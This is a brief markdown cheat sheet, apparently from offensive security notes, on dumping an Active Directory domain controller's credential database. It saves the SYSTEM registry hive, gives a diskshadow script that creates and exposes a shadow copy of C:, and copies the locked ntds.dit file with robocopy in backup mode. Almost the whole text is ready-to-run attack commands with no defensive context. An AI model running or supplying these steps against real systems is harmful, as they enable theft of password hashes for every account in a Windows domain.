# Using shadowdisk/robocopy

1. Grab SYSTEM
```bash
reg save HKLM\SYSTEM C:\TEMP\Documents\SYSTEM
```

2. Create shadowcopy.txt
```bash
→ cat shadowscript.txt
set metadata C:\Windows\System32\spool\drivers\color\sss.cabs
set context clientaccessibles
set context persistents
begin backups
add volume c: alias coldfx#
creates
expose %coldfx% z:#
```

3. execute the script with diskshadow
```bash
diskshadow /s shadowscript.txt
```

4. copy
```bash
cd C:\TEMP
robocopy /B z:\Windows\ntds .\new_ntds ntds.dit
```
